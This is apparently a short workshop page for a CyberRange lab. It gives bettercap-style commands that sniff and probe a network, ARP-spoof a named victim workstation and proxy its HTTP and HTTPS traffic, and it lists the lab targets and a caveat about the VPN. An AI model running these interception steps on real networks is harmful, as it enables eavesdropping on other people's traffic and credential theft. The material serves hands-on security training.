`net.sniff on`

`net.probe on`

`net.show`

`set arp.spoof.fullduplex true` (be carefull)

`set arp.spoof.targets 10.5.20.21`

`arp.spoof on`

`http.proxy on`

`https.proxy on`

# Targets in the CyberRange

The WOCSA [CyberRange](../../CyberRange/README.md) provides the lab. Victims are the two workstations `10.5.20.21` / `10.5.20.22` (reachable through the VPN) and `http://localhost:8080` (corporate site) is a good page to capture with `http.proxy`.

> Note: classic ARP spoofing requires attacker and victim on the same layer-2 segment. Over the WireGuard VPN, hosts are routed, not bridged, so ARP spoofing does not apply — run this workshop when attacker and victim are on the same LAN.